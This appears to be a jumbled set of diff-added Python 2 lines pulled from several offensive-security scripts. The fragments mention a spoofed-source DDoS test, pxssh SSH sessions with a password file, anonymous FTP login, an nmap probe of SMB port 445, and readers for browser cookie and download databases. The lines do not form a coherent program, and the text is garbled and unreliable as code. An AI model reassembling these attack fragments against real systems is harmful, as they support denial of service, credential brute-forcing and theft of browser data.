+passWord = 'guest'
+    findAttack(pcap)
+    findDownload(pcap)
+def ddosTest(src, dst, iface, count):
+        imgFileName = basename(urlsplit(imgSrc)[2])
+    except Exception, e:
+import sqlite3
+        conn = sqlite3.connect(msgDB)
+    browser = mechanize.Browser()
+            if r:
+        if ret == 2:
+    passwdFile = options.passwdFile
+    if url == None or dir == None:
+def sid2user(sid):
+        ftp.login('anonymous', 'me@your.com')
+    cookie_jar = cookielib.LWPCookieJar()
+    objects = json.load(response)
+        except Exception, e:
+def downloadImage(imgTag):
+        printMeta(fileName)
+    for line in fn.readlines():
+def printDownloads(downloadDB):
+    s.prompt()
+        iface = 'eth0'
+import pxssh
+        srcSpoof = options.srcSpoof
+        if nmScan[host].has_tcp(445):
+        new_gr = Google_Result(title, text, url)
